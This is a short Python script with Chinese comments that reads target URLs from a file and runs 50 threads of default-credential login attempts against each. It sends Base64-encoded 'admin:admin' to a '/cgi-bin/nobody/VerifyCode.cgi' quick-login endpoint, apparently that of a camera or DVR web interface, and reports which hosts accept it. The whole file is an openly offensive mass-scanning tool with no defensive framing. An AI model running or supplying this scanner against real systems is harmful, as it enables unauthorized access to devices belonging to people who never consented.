import requests
import base64
from concurrent.futures import ThreadPoolExecutor

def login(url):
    username = "admin"
    password = "admin"

    # 构造 Base64 编码的账户信息
    b64_credentials = base64.b64encode(f"{username}:{password}".encode("UTF-8")).decode("UTF-8")

    # 尝试登录
    login_url = f"{url}/cgi-bin/nobody/VerifyCode.cgi?account={b64_credentials}&login=quick"
    try:
        response = requests.get(login_url, verify=False, timeout=30)
        if response.status_code == 200:
            if "error" not in response.text.lower():  # 检查是否登录成功
                print(f"Login successful for {username} at {url}!")
                return True  # 登录成功
            else:
                print(f"Login failed for {username} at {url}.")
                return False  # 登录失败
    except Exception as e:
        print(f"Error occurred during login for {username} at {url}: {e}")

    return False  # 默认返回失败

def read_targets(file_path):
    with open(file_path, 'r') as file:
        urls = [line.strip() for line in file if line.strip()]  # 读取并过滤非空行
    return urls

def main():
    file_path ='132.txt'  # 指定文档路径
    urls = read_targets(file_path)  # 从文件中读取域名

    # 使用线程池执行并行登录
    with ThreadPoolExecutor(max_workers=50) as executor:  # 可以根据需要调整 max_workers
        executor.map(login, urls)

if __name__ == "__main__":
    main()
